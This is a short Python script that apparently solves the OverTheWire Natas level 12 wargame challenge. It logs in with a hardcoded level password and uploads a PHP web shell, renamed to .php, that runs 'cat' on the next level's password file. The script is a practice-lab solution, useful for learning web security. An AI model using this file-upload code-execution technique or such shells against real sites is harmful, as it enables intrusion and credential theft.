# webscraper for natas12
import requests
from bs4 import BeautifulSoup
import re
from requests_toolbelt import MultipartEncoder

username = 'natas12'
password = 'EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3'
url = 'http://%s.natas.labs.overthewire.org/' % username
proxies = {
    'http': 'http://127.0.0.1:6996',
    'https': 'http://127.0.0.1:6996',
}
files = {'file':open('C:\\Users\\djohnston\\Documents\\Natas\\Overthewire\\natas12.php', 'rb')}
fields = {
    'MAX_FILE_SIZE': ('1000'),
    'filename': '7og15crnxx.php',
    'uploadedfile': '<?php echo exec("cat /etc/natas_webpass/natas13"); ?>',
}

def initialRequest():
    session = requests.Session()
    resp = session.get(url, auth=(username, password))
    content = resp.text
    soup = BeautifulSoup(content, 'html.parser')
    viewSourceURI = soup.find('a')['href']
    print(viewSourceURI)
    return viewSourceURI

def sourceRequest():  # shows 'include "includes/secret.inc";'
    session = requests.Session()
    resp2 = session.get(url + '/' + viewSource, auth=(username, password))
    content = resp2.text
    print(content)
    soup = BeautifulSoup(content, 'html.parser')
    print(soup.code)

def uploadRequest():
    session = requests.Session()
    m = MultipartEncoder(fields, boundary='---------------------------57052814523281')
    resp3 = session.post(url, auth=(username, password), headers={'Content-Type': m.content_type}, data=m.to_string(), proxies=proxies)
    content = resp3.text
    print(content)



viewSource = initialRequest()
sourceRequest()
uploadRequest()

